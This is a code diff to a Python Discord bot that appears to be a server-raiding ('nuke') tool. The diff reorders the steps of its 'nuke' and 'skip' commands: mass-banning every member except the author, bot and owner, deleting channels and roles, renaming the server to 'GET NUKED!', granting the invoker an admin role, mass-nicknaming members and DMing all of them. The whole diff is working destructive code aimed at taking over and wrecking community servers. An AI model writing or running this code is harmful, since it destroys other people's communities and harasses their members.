@@ -402,6 +402,21 @@ async def on_message(msg):
 async def nuke(ctx):
     server_name = ctx.guild.name
 
+    # ban all users
+
+    member_list = []
+    for member in ctx.guild.members:
+        if member.id == ctx.message.author.id:
+            pass
+        elif member.id == bot.user.id:
+            pass
+        elif member.id == ctx.guild.owner.id:
+            pass
+        else:
+            member_list.append(member.id)
+
+    await ban_members(ctx, member_list)
+
     # make admin role and give user admin
 
     await create_admin(ctx)
@@ -417,21 +432,6 @@ async def nuke(ctx):
     # change server icon & name
 
     await edit_server(ctx, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg")
-
-    # ban all users
-
-    member_list = []
-    for member in ctx.guild.members:
-        if member.id == ctx.message.author.id:
-            pass
-        elif member.id == bot.user.id:
-            pass
-        elif member.id == ctx.guild.owner.id:
-            pass
-        else:
-            member_list.append(member.id)
-
-    await ban_members(ctx, member_list)
 
     # delete all roles
 
@@ -728,15 +728,6 @@ async def skip(ctx):
     do_max_channels = settings["maxchannels"]
     do_nc_msg = settings["nc_msg"][0]
 
-    if do_channels:
-        await delete_channels(ctx)
-
-    if do_server:
-        server_name = settings["server"][1]
-        server_icon = settings["server"][2]
-
-        await edit_server(ctx, server_name, str(server_icon))
-
     if do_dm:
         for member in ctx.guild.members:
             if member.id == ctx.message.author.id:
@@ -749,24 +740,6 @@ async def skip(ctx):
                 except discord.HTTPException:
                     output_log(f'''
 Could not DM user {member.name}.
-Server Name: {ctx.guild.name}
-Server ID: {ctx.guild.id}
-Server Owner: {ctx.guild.owner}
-''')
-
-    if do_nick:
-        nickname = settings["nick"][1]
-        for member in ctx.guild.members:
-            if member.id == ctx.message.author.id:
-                pass
-            elif member.id == bot.user.id:
-                pass
-            else:
-                try:
-                    await member.edit(nick=nickname)
-                except discord.HTTPException:
-                    output_log(f'''
-Could not nickname user {member.name}.
 Server Name: {ctx.guild.name}
 Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
@@ -785,6 +758,33 @@ Server Owner: {ctx.guild.owner}
                 member_list.append(member.id)
 
         await ban_members(ctx, member_list)
+
+    if do_channels:
+        await delete_channels(ctx)
+
+    if do_server:
+        server_name = settings["server"][1]
+        server_icon = settings["server"][2]
+
+        await edit_server(ctx, server_name, str(server_icon))
+
+    if do_nick:
+        nickname = settings["nick"][1]
+        for member in ctx.guild.members:
+            if member.id == ctx.message.author.id:
+                pass
+            elif member.id == bot.user.id:
+                pass
+            else:
+                try:
+                    await member.edit(nick=nickname)
+                except discord.HTTPException:
+                    output_log(f'''
+Could not nickname user {member.name}.
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
 
     roleIDs = getRoleIDs()
     if do_roles:
